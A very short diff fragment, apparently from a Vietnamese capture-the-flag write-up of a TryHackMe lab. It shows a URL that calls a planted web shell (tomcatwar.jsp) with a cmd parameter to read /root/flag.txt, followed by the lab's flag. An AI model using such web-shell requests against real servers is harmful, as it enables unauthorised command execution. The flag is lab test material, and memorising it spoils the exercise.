@@ -64,3 +64,4 @@ if __name__ == '__main__':
 - sau đó truy cập: http://10.10.125.191/tomcatwar.jsp?pwd=thm&cmd=cat /root/flag.txt<br>
 
 As: THM{NjAyNzkyMjU0MzA1ZWMwZDdiM2E5YzFm}
+
